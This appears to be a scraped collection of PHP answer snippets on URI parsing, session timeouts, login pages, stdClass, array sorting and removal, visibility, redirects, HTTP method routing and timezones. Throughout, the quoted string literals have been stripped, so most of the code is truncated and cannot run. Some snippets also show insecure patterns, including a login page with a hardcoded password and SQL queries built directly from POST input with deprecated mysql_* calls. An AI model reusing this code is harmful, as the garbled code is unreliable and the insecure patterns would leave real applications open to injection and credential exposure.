separate the user name and password from host * $_Separator_Port - Use this to separate the port number from host * $_Separator_Query - Use this to separate the query data from base URL * $_Separator_Fragment - Use this to separate the fragment data from query data */ protected static $_Script_Hidden; protected static $_Public_Path; protected static $_Public_Relative; protected static $_Public_Skin; protected static $_Skin_Path; protected static $_Skin_Relative; protected static $_Skin_Default; protected static $_Fallback_Base; protected static $_Fallback_Scheme; protected static $_Fallback_User; protected static $_Fallback_Passwd; protected static $_Fallback_Host; protected static $_Fallback_Port; protected static $_Fallback_Script; protected static $_Separator_Scheme; protected static $_Separator_Credentials; protected static $_Separator_Auth; protected static $_Separator_Port; protected static $_Separator_Query; protected static $_Separator_Fragment; /** ---------------------------------------------------------------------------------------------------------------- * CACHED BASES * Precompiled common URLs for quick retrieval */ protected static $Base_Host; protected static $Base_App; protected static $Base_Script; protected static $Base_Current; protected static $Base_Public; protected static $Base_Skin; /** ---------------------------------------------------------------------------------------------------------------- * DATA CONTAINERS * Raw URI segments saved from extracted data */ protected static $__Segments = array( ); /** ---------------------------------------------------------------------------------------------------------------- * PARSER KEYWORDS * URI data asigned to specific keywords. */ protected static $__Parsers; /** ---------------------------------------------------------------------------------------------------------------- * CLASS INITIALIZER * Initialize the class * * @access public * @param $Params [array] - An associative array of supported parrameters * @return void */ public static function __Init($Params=array()) { self::$_Script_Hidden = (isset($Params[ self::$_Public_Path = (isset($Params[ self::$_Public_Relative = (isset($Params[ self::$_Public_Skin = (isset($Params[ self::$_Skin_Path = (isset($Params[ self::$_Skin_Relative = (isset($Params[ self::$_Skin_Default = (isset($Params[ self::$_Fallback_Base = (isset($Params[ self::$_Fallback_Scheme = (isset($Params[ self::$_Fallback_User = (isset($Params[ self::$_Fallback_Passwd = (isset($Params[ self::$_Fallback_Host = (isset($Params[ self::$_Fallback_Port = (isset($Params[ self::$_Fallback_Script = (isset($Params[ self::$_Separator_Scheme = (isset($Params[ self::$_Separator_Credentials = (isset($Params[ self::$_Separator_Auth = (isset($Params[ self::$_Separator_Port = (isset($Params[ self::$_Separator_Query = (isset($Params[ self::$_Separator_Fragment = (isset($Params[ self::$_Public_Path = implode( self::$_Skin_Path = implode( self::Extract(); self::$Base_Host = self::Compile( self::$Base_App = self::Compile( self::$Base_Script = self::$Base_App.(self::$_Script_Hidden ? self::$Base_Current = self::$Base_Script.(empty(self::$__Segments[ self::$Base_Public = self::$_Public_Relative ? self::$_Public_Path : self::$Base_App. self::$Base_Skin = self::$_Skin_Relative ? self::$_Skin_Path : self::$Base_Public. self::$Base_Skin .= self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ self::$__Parsers[ } /** ---------------------------------------------------------------------------------------------------------------- * URI EXTRACTOR * Try every posibility to obtain all the segments of the current URL * * @access public * @return array */ public static function Extract() { if (!empty(self::$__Segments[ $Script_URI = (isset($_SERVER[ if (empty($Script_URI)) { $Script_URI = parse_url(self::$_Fallback_Base); } if (isset($_SERVER[ $Script_Path = $_SERVER[ } elseif (isset($_SERVER[ $Script_Path = preg_replace( } elseif (isset($Script_URI[ $Script_Path = $Script_URI[ } elseif (isset($_SERVER[ $Script_Path = isset($_SERVER[ } elseif (isset($_SERVER[ $Script_Path = substr($_SERVER[ (strlen($_SERVER[ $Script_Path .= (isset($_SERVER[ } else { $Script_Path = } if (strlen($Script_Path) > 0) { $Script_Path = preg_split( } else { $Script_Path = array(); } if (isset($_SERVER[ $Script_Name = basename($_SERVER[ } elseif (isset($_SERVER[ $Script_Name = basename($_SERVER[ } else { $Script_Name = self::$_Fallback_Script; } $Script_Split = (is_string($Script_Name)) ? array_search($Script_Name, $Script_Path, TRUE) : NULL; if (isset($_SERVER[ self::$__Segments[ } elseif (isset($_SERVER[ self::$__Segments[ self::$__Segments[ self::$__Segments[ } elseif (isset($Script_URI[ self::$__Segments[ } else { self::$__Segments[ } if (isset($_SERVER[ self::$__Segments[ } elseif (isset($Script_URI[ self::$__Segments[ } else { self::$__Segments[ } if (isset($_SERVER[ self::$__Segments[ } elseif (isset($Script_URI[ self::$__Segments[ } else { self::$__Segments[ } if (isset($_SERVER[ self::$__Segments[ } elseif (isset($_SERVER[ self::$__Segments[ } elseif (isset($Script_URI[ self::$__Segments[ } else { self::$__Segments[ } if (isset($Script_URI[ self::$__Segments[ } else { self::$__Segments[ } if (is_numeric($Script_Split)) { self::$__Segments[ } else { self::$__Segments[ } if (is_string($Script_Name)) { self::$__Segments[ } else { self::$__Segments[ } if (isset($_SERVER[ self::$__Segments[ } elseif (is_numeric($Script_Split)) { self::$__Segments[ } else { self::$__Segments[ } return self::$__Segments; } /** ---------------------------------------------------------------------------------------------------------------- * URI COMPILER * Compile raw URI segments into a usable URL * * @access public * @param $Until [string] - The name of the segment where compilation should stop and return * @return string */ public static function Compile($Until=NULL) { $URI= $Until = (is_string($Until)) ? strtoupper($Until) : $Until; if ($Until === return $URI .= (self::$__Segments[ } else { $URI .= (self::$__Segments[ } if ($Until === return $URI .= (self::$__Segments[ } else { $URI .= (self::$__Segments[ } $URI .= (self::$__Segments[ if ($Until === return $URI .= (self::$__Segments[ } else { $URI .= (self::$__Segments[ } $URI .= (self::$__Segments[ if ($Until === return $URI .= (self::$__Segments[ } else { $URI .= (self::$__Segments[ } if ($Until === return $URI .= (self::$__Segments[ } else { $URI .= (self::$__Segments[ } if ($Until === return $URI .= (self::$__Segments[ } else { $URI .= (self::$__Segments[ } if ($Until === return $URI .= (self::$__Segments[ } else { $URI .= (self::$__Segments[ } if ($Until === return $URI .= (self::$__Segments[ } else { $URI .= (self::$__Segments[ } return $URI; } /** ---------------------------------------------------------------------------------------------------------------- * SEGMENT RETRIEVER * Return a specific URI segment * * @access public * @param $Name [string] - The name of the segment you want * @return string (on success) bool (on failure) */ public static function Segment($Name) { if (isset(self::$__Segments[$Name])) { return self::$__Segments[$Name]; } return FALSE; } /** ---------------------------------------------------------------------------------------------------------------- * BASE RETRIEVER * Return a specific precompiled base * * @access public * @param $Name [string] - The name of the base you want * @return mixed (on success) boolean (on failure) */ public static function Base($Name) { switch ($Name) { case case return self::$Base_Host; break; case case return self::$Base_App; break; case case return self::$Base_Script; break; case case return self::$Base_Current; break; case case return self::$Base_Public; break; case case return self::$Base_Skin; break; case return array( ); break; } return FALSE; } /** ---------------------------------------------------------------------------------------------------------------- * STRING PARSER * Replace known keywords in the specified string with current URI data * * @access public * @param $String [string] - A string that you want to parse * @return void */ public static function Parse($String) { if (is_string($String)) { return str_replace(self::$__Parsers[ } elseif (is_array($String)) { foreach ($String as $K => $V) { $Parsed[$K] = self::$replace($V); } return $Parsed; } return FALSE; } } if (isset($_URI_Params)) { _URI::__Init($_URI_Params); } else { _URI::__Init(); }
<?php $_URI_Params = array( ); require( echo var_dump(_URI::Extract()); echo echo echo echo echo echo echo echo echo echo echo echo echo echo echo echo echo echo echo var_dump(_URI::Base( echo echo _URI::Parse( And the current application is here: %AppBase% I load my skins form: %SkinBase% etc.
<?php $request_url = apache_getenv("HTTP_HOST") . apache_getenv("REQUEST_URI"); echo $request_url; ?>
$url = $_SERVER[ echo "$url<br />"; $host=$_SERVER[ echo "$host<br />"; $fullurl = "http: echo $fullurl;
$base = "http: $url = $base . "/" . dirname(dirname(__FILE__));
function curPageURL() { if(isset($_SERVER["HTTPS"]) && !empty($_SERVER["HTTPS"]) && ($_SERVER["HTTPS"] != $url = } else { $url = } if(( $_SERVER["SERVER_PORT"] != 80 )) { $url .= $_SERVER["SERVER_PORT"]; } $url .= $_SERVER["REQUEST_URI"]; return $url; } echo curPageURL();
$base_dir = __DIR__; $doc_root = preg_replace("!{$_SERVER[ $base_url = preg_replace("!^{$doc_root}!", $base_url = str_replace( $base_url = str_replace($doc_root, $protocol = empty($_SERVER[ $port = $_SERVER[ $disp_port = ($protocol == $domain = $_SERVER[ $full_url = "$protocol:
if ( ! array_key_exists( $this->referer = $_SERVER[ } else { $this->referer = $_SERVER[ }
function current_url() { $current_url = ( $_SERVER["HTTPS"] != $current_url .= ( $_SERVER["SERVER_PORT"] != 80 ) ? ":".$_SERVER["SERVER_PORT"] : ""; $current_url .= $_SERVER["REQUEST_URI"]; return $current_url; }
$protocol_https = filter_input(INPUT_SERVER, $host = filter_input(INPUT_SERVER, $request_uri = filter_input(INPUT_SERVER, if(strlen($request_uri) == 0) { $request_uri = filter_input(INPUT_SERVER, $query_string = filter_input(INPUT_SERVER, if($query_string) { $request_uri .= } } $full_url = ($protocol_https ?
public static function getCurrentURL() { $protocol = strpos(strtolower($_SERVER[ $host = $_SERVER[ $script = $_SERVER[ $params = $_SERVER[ return $protocol . }
if($_SERVER[ define( define( define( define( } else{ define( define( define( define( define( }
if (isset($_SESSION[ session_unset(); session_destroy(); } $_SESSION[
if (!isset($_SESSION[ $_SESSION[ } else if (time() - $_SESSION[ session_regenerate_id(true); $_SESSION[ }
<?php session_start(); ?> <html> <form name="form1" method="post"> <table> <tr> <td>Username</td> <td><input type="text" name="text"></td> </tr> <tr> <td>Password</td> <td><input type="password" name="pwd"></td> </tr> <tr> <td><input type="submit" value="SignIn" name="submit"></td> </tr> </table> </form> </html> <?php if (isset($_POST[ $v1 = "FirstUser"; $v2 = "MyPassword"; $v3 = $_POST[ $v4 = $_POST[ if ($v1 == $v3 && $v2 == $v4) { $_SESSION[ $_SESSION[ $_SESSION[ header( } else { echo "Please enter the username or password again!"; } } ?>
<?php session_start(); if (!isset($_SESSION[ echo "Please Login again"; echo "<a href= } else { $now = time(); if ($now > $_SESSION[ session_destroy(); echo "Your session has expired! <a href= } else { ?> <!-- From here all HTML coding can be done --> <html> Welcome <?php echo $_SESSION[ echo "<a href= ?> </html> <?php } } ?>
<?php session_start(); session_destroy(); header( ?>
$_SESSION[ if ((time() - $_SESSION[ unset($_SESSION[ }
<?php /*** * Starts a session with a specific timeout and a specific GC probability. * @param int $timeout The number of seconds until it should time out. * @param int $probability The probablity, in int percentage, that the garbage * collection routine will be triggered right now. * @param strint $cookie_domain The domain path for the cookie. */ function session_start_timeout($timeout=5, $probability=100, $cookie_domain= ini_set("session.gc_maxlifetime", $timeout); ini_set("session.cookie_lifetime", $timeout); $seperator = strstr(strtoupper(substr(PHP_OS, 0, 3)), "WIN") ? "\\" : "/"; $path = ini_get("session.save_path") . $seperator . "session_" . $timeout . "sec"; if(!file_exists($path)) { if(!mkdir($path, 600)) { trigger_error("Failed to create session save path directory } } ini_set("session.save_path", $path); ini_set("session.gc_probability", $probability); ini_set("session.gc_divisor", 100); session_start(); if(isset($_COOKIE[session_name()])) { setcookie(session_name(), $_COOKIE[session_name()], time() + $timeout, $cookie_domain); } }
<IfModule mod_php5.c> php_value session.cookie_lifetime 1800 php_value session.gc_maxlifetime 1800 </IfModule>
if (isSet($_SESSION[ if((mktime() - $_SESSION[ } } else { $_SESSION[ }
$lifetime = strtotime( session_set_cookie_params($lifetime); session_start();
function session_timeout_ok() { global $db; $timeout = SESSION_TIMEOUT; $ok = false; $session_id = session_id(); $sql = "SELECT time FROM sessions WHERE session_id = $rows = $db->query($sql); if ($rows === false) { $ok = FALSE; } else { if (count($rows) > 0) { $zeile = $rows[0]; $time_past = $zeile[ if ( $timeout + $time_past < time() ) { session_destroy(); $sql = "DELETE FROM sessions WHERE session_id = $affected = $db -> query($sql); $ok = FALSE; } else { $ok = TRUE; $sql = "UPDATE sessions SET time= $erg = $db -> query($sql); if ($erg == false) { } } } else { $sql = "INSERT INTO sessions(session_id,time) VALUES ( $res = $db->query($sql); if ($res === FALSE) { $ok = false; } $ok = true; } return $ok; } return $ok; }
<?php $user = $_POST[ $pass = $_POST[ require ( $result = mysql_query(sprintf("SELECT * FROM accounts WHERE user_Name= if( mysql_num_rows( $result ) > 0) { $array = mysql_fetch_assoc($result); session_start(); $_SESSION[ $_SESSION[ header("Location:loggedin.php"); } else { header("Location:login.php"); } ?>
<?php session_start(); if( !isset( $_SESSION[ { header("Location:login.php"); } else { echo ( "this session is ". $_SESSION[ } ?>
$expiry = 1800 ; if (isset($_SESSION[ session_unset(); session_destroy(); } $_SESSION[
<?php if (!isset($_SESSION)) { $session = session_start(); } if ($session && !isset($_SESSION[ if ($session == 1) { $_SESSION[ echo "Login :".$_SESSION[ echo "<br>"; $_SESSION[ echo "Session Idle :".$_SESSION[ echo "<br>"; } else{ $_SESSION[ } } else { if (time()>$_SESSION[ echo "Session Idle :".$_SESSION[ echo "<br>"; echo "Current :".time(); echo "<br>"; echo "Session Time Out"; session_destroy(); session_unset(); } else { echo "Logged In<br>"; } } ?>
class Session{ public static function init(){ ini_set( session_start(); } public static function set($key, $val){ $_SESSION[$key] =$val; } public static function get($key){ if(isset($_SESSION[$key])){ return $_SESSION[$key]; } else{ return false; } } public static function checkSession(){ self::init(); if(self::get("adminlogin")==false){ self::destroy(); header("Location:login.php"); } } public static function checkLogin(){ self::init(); if(self::get("adminlogin")==true){ header("Location:index.php"); } } public static function destroy(){ session_destroy(); header("Location:login.php"); } }
<?php $json = $stdInstance = json_decode($json); echo $stdInstance->foo . PHP_EOL; echo $stdInstance->number . PHP_EOL; $array = json_decode($json, true); echo $array[ echo $array[
class Foo{} $foo = new Foo(); echo ($foo instanceof stdClass)?
$page=new stdClass(); $page->name= $page->status=1;
<?php class PageShow { public $currentpage; public function __construct($pageobj) { $this->currentpage = $pageobj; } public function show() { echo $this->currentpage->name; $state = ($this->currentpage->status == 1) ? echo } }
$array_user = array(); $array_user["name"] = "smith john"; $array_user["username"] = "smith"; $array_user["id"] = "1002"; $array_user["email"] = "smith@nomail.com";
$obj_user = new stdClass; $obj_user->name = "smith john"; $obj_user->username = "smith"; $obj_user->id = "1002"; $obj_user->email = "smith@nomail.com";
$book = new stdClass; $book->title = "Harry Potter and the Prisoner of Azkaban"; $book->author = "J. K. Rowling"; $book->publisher = "Arthur A. Levine Books"; $book->amazon_link = "http:
class Example { private $options; public function __construct(Array $setup) { $this->options = (object) $setup; echo $this->options->{ echo $this->options->surname; } } $ob1 = new Example(["name" => "John", "surname" => "Doe"]);
$array = array( ); $obj = (object) $array; echo $obj->Property3;
php > $a = new stdClass(); php > $b = new stdClass(); php > var_dump($a === $b); bool(false) php > var_dump($a == $b); bool(true) php > var_dump($a); object(stdClass) } php > var_dump($b); object(stdClass) } php >
$example = new Example(); $example->name = "some name"; $example->age = 22;
$data=array( class data={} $data=new data(); $data->k1= $data->k2=
Array ( [0] => Array ( [hashtag] => a7e87329b5eab8578f4f1098a152d6f4 [title] => Flower [order] => 3 ) [1] => Array ( [hashtag] => b24ce0cd392a5b0b8dedc66c25213594 [title] => Free [order] => 2 ) [2] => Array ( [hashtag] => e7d31fc0602fb2ede144d18cdffd816b [title] => Ready [order] => 1 ) )
function sortByOrder($a, $b) { return $a[ } usort($myArray,
usort($myArray, function($a, $b) { $retval = $a[ if ($retval == 0) { $retval = $a[ if ($retval == 0) { $retval = $a[ } } return $retval; });
function aasort (&$array, $key) { $sorter=array(); $ret=array(); reset($array); foreach ($array as $ii => $va) { $sorter[$ii]=$va[$key]; } asort($sorter); foreach ($sorter as $ii => $va) { $ret[$ii]=$array[$ii]; } $array=$ret; } aasort($your_array,"order");
function array_sort_by_column(&$arr, $col, $dir = SORT_ASC) { $sort_col = array(); foreach ($arr as $key=> $row) { $sort_col[$key] = $row[$col]; } array_multisort($sort_col, $dir, $arr); } array_sort_by_column($array,
function compareOrder($a, $b) { return $a[ } usort($array,
$sort = array(); $array_lowercase = array_map( array_multisort($array_lowercase, SORT_ASC, SORT_STRING, $alphabetically_ordered_array);
uasort($myArray, function($a, $b) { return strcmp($a[ });
$new = [ [ ], [ ], [ ], ]; $keys = array_column($new, $result = array_multisort($keys, SORT_ASC, $new);
Array ( [0] => Array ( [hashtag] => e7d31fc0602fb2ede144d18cdffd816b [title] => Ready [order] => 1 ) [1] => Array ( [hashtag] => b24ce0cd392a5b0b8dedc66c25213594 [title] => Free [order] => 2 ) [2] => Array ( [hashtag] => a7e87329b5eab8578f4f1098a152d6f4 [title] => Flower [order] => 3 ) )
Arr::sortByKeys(array $array, $keys, bool $assoc = true): array
$tempArray = array(); $annotations = array(); while($row = mysql_fetch_array($result)) { $needle = $row[0]; arrayIndexes($needle); $annotations[$needle][ } asort($tempArray); foreach ($tempArray as $arrayKey) { $dataInOrder = $annotations[$arrayKey][ } function arrayIndexes ($needle) { global $tempArray; if (!in_array($needle,$tempArray)) { array_push($tempArray,$needle); } }
$first_value = reset($array); $first_key = key($array);
list($firstItem) = $yourArray; list($firstItem) = functionThatReturnsArray(); list( , $secondItem) = $yourArray;
list($firstKey) = array_keys($yourArray); list(, $secondKey) = array_keys($yourArray);
foreach($array_with_unknown_keys as $key=>$value) break;
function grab_first($arr) { foreach($arr as $value) return $value; }
$my_array = [ $first_key = array_key_first($my_array); $first_value = $my_array[$first_key]; $last_key = array_key_last($my_array); $last_value = $my_array[$last_key];
$first_value = $my_array[ array_key_first($my_array) ]; $last_value = $my_array[ array_key_last($my_array) ];
$first_value = empty($my_array) ? $last_value = empty($my_array) ?
$data = [ current($data); next($data); head($data); next($data);
function head($array, $default = null) { foreach ($array as $item) { return $item; } return $default; }
$myArray = array (4 => $arrayKeys = array_keys($myArray); echo $myArray[$arrayKeys[0]];
$arr = array( 4 => foreach($arr as $first) break; echo $first;
$foo = array( 4 => function get_first ($foo) { foreach ($foo as $k=>$v){ return $v; } } print get_first($foo);
<?php $original = array(4 => array( reset($original); $first_element = current($original); ?>
$first = array_slice($array, 0, 1); $val= $first[0];
<?php $array = array( 4 => $result = $array[4]; assert( ?>
<?php $array = array( 4 => $array = array_flip($array); $firstKey = key($array); assert( ?>
$array1 = array(); $array2 = array(1,2,3,4); $array3 = array( $array4 = null; var_dump( var_dump( var_dump( var_dump( var_dump( var_dump( var_dump( var_dump( var_dump( var_dump( var_dump( var_dump( var_dump( var_dump( var_dump( var_dump( var_dump( var_dump( var_dump( var_dump( list($elm) = $array1; var_dump($elm); list($elm) = $array2; var_dump($elm); list($elm) = $array3; var_dump($elm); list($elm) = $array4; var_dump($elm);
$elm = empty($array)? null : ...($array); ...you would use without errors: $array[count($array)-1] ; array_shift reset array_values array_slice
var_dump(call_user_func(function($arr) { list($x) = $arr; return $x; }, some_array()));
var_dump(call_user_func(function($arr) { return reset($arr); }, array_values(some_array())));
/** * A quick and dirty way to determine whether the passed in array is associative or not, assuming that either:<br/> * <br/> * 1) All the keys are strings - i.e. associative<br/> * or<br/> * 2) All the keys are numeric - i.e. not associative<br/> * * @param array $objects * @return boolean */ private function isAssociativeArray(array $objects) { reset($objects); return count($objects) > 0 && is_string(key($objects)); }
$array = array(1, 2, 3, 4, 5); $output = array_slice($array, 0, 1); print_r ($output);
$first_item_of_array = current($tmp_arr = mysql_fetch_row(...)); $first_item_of_array = reset($tmp_arr = func_get_my_huge_array());
function array_first(array $f) { foreach ($f as $v) { return $v; } throw new Exception( }
public $variable; public function doSomething() { } private $variable; private function doSomething() { } protected $variable; protected function doSomething() { }
<?php class GrandPa { public $name= } class Daddy extends GrandPa { function displayGrandPaName() { return $this->name; } } $daddy = new Daddy; echo $daddy->displayGrandPaName(); $outsiderWantstoKnowGrandpasName = new GrandPa; echo $outsiderWantstoKnowGrandpasName->name;
<?php class GrandPa { protected $name = } class Daddy extends GrandPa { function displayGrandPaName() { return $this->name; } } $daddy = new Daddy; echo $daddy->displayGrandPaName(); $outsiderWantstoKnowGrandpasName = new GrandPa; echo $outsiderWantstoKnowGrandpasName->name;
<?php class GrandPa { private $name = } class Daddy extends GrandPa { function displayGrandPaName() { return $this->name; } } $daddy = new Daddy; echo $daddy->displayGrandPaName(); $outsiderWantstoKnowGrandpasName = new GrandPa; echo $outsiderWantstoKnowGrandpasName->name;
<?php class GrandPas { public $name1 = protected $name2 = private $name3 = } $granpaWithoutReflection = new GrandPas; echo " echo "Printing members the usual way.. (without reflection)<br>"; foreach($granpaWithoutReflection as $k=>$v) { echo "The name of grandpa is $v and he resides in the variable $k<br>"; } echo "<br>"; $granpa = new ReflectionClass( $granpaNames=$granpa->getDefaultProperties(); echo " echo "Printing members the foreach($granpaNames as $k=>$v) { echo "The name of grandpa is $v and he resides in the variable $k<br>"; }
Printing members the usual way.. (Without reflection) The name of grandpa is Mark Henry and he resides in the variable name1 Printing members the The name of grandpa is Mark Henry and he resides in the variable name1 The name of grandpa is John Clash and he resides in the variable name2 The name of grandpa is Will Jones and he resides in the variable name3
<?php class GrandPas { public $name1 = protected $name2 = private $name3 = } $granpaWithoutReflections = new GrandPas; print_r($granpaWithoutReflections);
GrandPas Object ( [name1] => Mark Henry [name2:protected] => John Clash [name3:GrandPas:private] => Will Jones )
/** * Define MyClass */ class MyClass { public $public = protected $protected = private $private = function printHello() { echo $this->public; echo $this->protected; echo $this->private; } } $obj = new MyClass(); echo $obj->public; echo $obj->protected; echo $obj->private; $obj->printHello(); /** * Define MyClass2 */ class MyClass2 extends MyClass { protected $protected = function printHello() { echo $this->public; echo $this->protected; echo $this->private; } } $obj2 = new MyClass2(); echo $obj2->public; echo $obj2->private; echo $obj2->protected; $obj2->printHello();
$myObject = new MyObject() $myObject->publicVar = $pubVar = $myObject->publicVar;
$myObject = new MyObject() $myObject->setProtectedVar( $protectedVar = $myObject->getProtectedVar();
$this->setPrivateVar( $privateVar = $this->getPrivateVar();
HTTP/1.1 200 OK Powered-By: PHP/5.3.7 Vary: Accept-Encoding Content-Type: text/html; charset=utf-8 <html><head><title>PHP page output page</title></head> <body><h1>Content</h1> <p>Some more output follows...</p> and <a href="/"> <img src=internal-icon-delayed> </a>
error_reporting(E_ALL); ini_set("display_errors", 1);
if (headers_sent()) { die("Redirect failed. Please click on this link: <a href=...>"); } else{ exit(header("Location: /user.php")); }
<meta http-equiv="Refresh" content="2; url=../target.html">
<script> location.replace("target.html"); </script>
THERE SHOULD BE NO BLANK SPACES HERE <?php echo "your code here"; ?> DO CHECK FOR BLANK SPACES HERE AS WELL; THIS LINE (blank line) SHOULD NOT EXIST.
<?php ?> ----------This is the end of the an_important_file-------------------
<?php includes ?> <!-- This new line will also arise error --> <?php session_start(); session_regenerate_id();
<?php $method = $_SERVER[ $request = explode("/", substr(@$_SERVER[ switch ($method) { case do_something_with_put($request); break; case do_something_with_post($request); break; case do_something_with_get($request); break; default: handle_error($request); break; }
$method = $_SERVER[ if ($method == } elseif ($method == } elseif ($method == } elseif ($method == } else { }
<!-- DELETE method --> <form action= <input type="hidden" name </form> <!-- PUT method --> <form action= <input type="hidden" name </form>
$app = new \Slim\Slim(); $app->get( echo "Hello, $name"; }); $app->run();
$router = new AltoRouter(); $router->setBasePath( $router->map( $router->map( $router->map( $router->map(
<?php $method = $_SERVER[ switch ($method) { case break; case break; case break; case break; } ?>
$request = new \Zend\Http\PhpEnvironment\Request(); $httpMethod = $request->getMethod();
<?php $method = $_SERVER[ switch ($method) { case echo break; case echo break; case echo break; case echo break; case echo break; case echo break; case echo break; case echo break; case echo break; case echo break; case echo break; case echo break; case echo break; case echo break; Default: echo break; } ?>
function get_request_method() { $request_method = strtolower($_SERVER[ if($request_method != return $request_method; } if($request_method == return strtolower($_POST[ } return $request_method; }
<form method="post"> <input name="_method" type="hidden" value="delete" /> <input type="submit" value="Submit"> </form>
&copy; <?php $copyYear = 2008; $curYear = date( echo $copyYear . (($copyYear != $curYear) ? ?> Me, Inc.
&copy; <?php call_user_func(function($y){$c=date( Me, Inc.
$date = new simpleDate(); echo $date->now()->getYear(); echo $date->now()->getMonth(); echo $date->set( echo $date->now()->compare( ...
<?php $current= new \DateTime(); $future = new \DateTime( echo $current->format( ?>
<?PHP $now = new DateTime; $now->modify( echo $now->format( ?>
**Symbol, Year, Author/Owner and Rights statement.**
<?php date_default_timezone_set("Asia/Kolkata");?><?=date("Y");?>
<p class="text-muted credit">Copyright &copy; <?php $copyYear = 2017; $curYear = date( echo $copyYear . (($copyYear != $curYear) ? ?> </p>
<?php $time_now=mktime(date( $dateTime = date( echo $dateTime; ?>
Configuration File (php.ini) Path: /etc/php5/cli Loaded Configuration File: /etc/php5/cli/php.ini Scan for additional .ini files in: /etc/php5/cli/conf.d Additional .ini files parsed: /etc/php5/cli/conf.d/curl.ini, /etc/php5/cli/conf.d/pdo.ini, /etc/php5/cli/conf.d/pdo_sqlite.ini, /etc/php5/cli/conf.d/sqlite.ini, /etc/php5/cli/conf.d/sqlite3.ini, /etc/php5/cli/conf.d/xdebug.ini, /etc/php5/cli/conf.d/xsl.ini
Loaded Configuration File => /usr/local/lib/php.ini
Configuration File (php.ini) Path: /usr/local/lib Loaded Configuration File: /usr/local/lib/php.ini
[root@AnyDirectory ~] /etc/php.ini /etc/php.ini.rpmnew /usr/share/doc/php-common-5.4.45/php.ini-development /usr/share/doc/php-common-5.4.45/php.ini-production
print php_ini_loaded_file(); print_r(php_ini_scanned_files());
$ -> php -i | ack config Configure Command => Loaded Configuration File => /path/to/php.ini
<?php if(rand(1,3) == 1){ header("HTTP/1.0 404 Not Found"); die(); } /* Send a string after a random number of seconds (2-10) */ sleep(rand(2,10)); echo("Hi! Have a random number: " . rand(1,10)); ?>
<? header( echo After 5 seconds this will go away and a cat will appear... --endofsection flush(); sleep(5); echo $stream = fopen( fpassthru($stream); fclose($stream); echo ' --endofsection
abstract class LongPoller { protected $sleepTime = 5; protected $timeoutTime = 30; function __construct() { } function setTimeout($timeout) { $this->timeoutTime = $timeout; } function setSleep($sleep) { $this->sleepTime = $sleepTime; } public function run() { $data = NULL; $timeout = 0; set_time_limit($this->timeoutTime + $this->sleepTime + 15); while($data == NULL && $timeout < $this->timeoutTime) { $data = $this->loadData(); if($data == NULL){ flush(); sleep($this->sleepTime); $timeout += $this->sleepTime; }else{ echo $data; flush(); } } } protected abstract function loadData(); }
import os.path PROJECT_DIR = os.path.dirname(__file__) TEMPLATE_DIRS = ( os.path.join(PROJECT_DIR, )
from django.views.generic.simple import direct_to_template from lp.msgsrv.views import retmsg urlpatterns = patterns( (r (r )
from random import randint from time import sleep from django.http import HttpResponse, HttpResponseNotFound def retmsg(request): if randint(1,3) == 1: return HttpResponseNotFound( else: sleep(randint(2,10)) return HttpResponse(
var comet = new iComet({ sign_url: sub_url: callback: function(msg){ alert(msg.content); } });
if (($key = array_search($del_val, $messages)) !== false) { unset($messages[$key]); }
foreach (array_keys($messages, 401, true) as $key) { unset($messages[$key]); }
$key = array_search($del_val, $array); if (false !== $key) { unset($array[$key]); }
$array = array_filter($array, function($e) use ($del_val) { return ($e !== $del_val); });
$fields = array_flip($fields); unset($fields[ $fields = array_flip($fields);
array_splice($array, array_search(58, $array ), 1);
foreach ($array as $key => $value){ if ($value == $target_value) { unset($array[$key]); } }
function array_remove_by_value($array, $value) { return array_values(array_diff($array, array($value))); } $array = array(312, 401, 1599, 3); $newarray = array_remove_by_value($array, 401); print_r($newarray);
while (($key = array_search($del_val, $messages)) !== false) { unset($messages[$key]); }
$array = array_filter($array, function($i) use ($value){return $i != $value;});
function array_reject_value(array &$arrayToFilter, $deleteValue) { $filteredArray = array(); foreach ($arrayToFilter as $key => $value) { if ($value !== $deleteValue) { $filteredArray[] = $value; } } return $filteredArray; }
function array_reject(array &$arrayToFilter, callable $rejectCallback) { $filteredArray = array(); foreach ($arrayToFilter as $key => $value) { if (!$rejectCallback($value, $key)) { $filteredArray[] = $value; } } return $filteredArray; }
$messages = [312, 401, 1599, 3, 6]; $messages = array_reject_value($messages, 401);
$messages = [312, 401, 1599, 3, 6]; $messages = array_reject($messages, function ($value) { return $value === 401; });
$messages = [312, 401, 1599, 3, 6]; $greaterOrEqualThan = 401; $messages = array_reject($messages, function ($value) use $greaterOrEqualThan { return $value >= $greaterOrEqualThan; });
function test($value, $tab) { if(($key = array_search($value, $tab)) !== false) { unset($tab[$key]); return true; } else if (array_key_exists($value, $tab)){ unset($tab[$value]); return true; } else { return false; } }
$arrayWithValuesRemoved = array_diff($arrayOfData, $arrayOfValuesToRemove);
$result = array(); $del_value = 401; foreach($arr as $key =>$value){ if ($value !== $del_value){ $result[$key] = $value; } } return $result
$input = array(4, "4", "3", 4, 3, "3"); $result = array_unique($input); var_dump($result);
($key = array_search($del_val, $messages)) !== false or unset($messages[$key]);
$messages=array(); $messages[312] = 312; $messages[401] = 401; $messages[1599] = 1599; $messages[3] = 3; unset($messages[3]);
if(($key = array_search($del_val, $messages)) !== false) { unset($messages[$key]); $arr = array_values($messages); }
array-diff-key() <?php $array1 = array( $array2 = array( var_dump(array_diff_key($array1, $array2)); ?>
$my_array = array(1=>"a", "second_value"=>"b", 3=>"c", "d"); $new_array_without_value_c = array_diff($my_array, array("c"));
$timezone = date_default_timezone_get(); echo "The current server timezone is: " . $timezone;
$date = date( $date = date( $date = $date = /** * This time is based on the default server time zone. * If you want the date in a different time zone, * say if you come from Nairobi, Kenya like I do, you can set * the time zone to Nairobi as shown below. */ date_default_timezone_set( $date = date( $date = date(
$now = new DateTime(); echo $now->format( echo $now->getTimestamp();
$now = new DateTime(null, new DateTimeZone( $now->setTimezone(new DateTimeZone( echo $now->getTimezone();
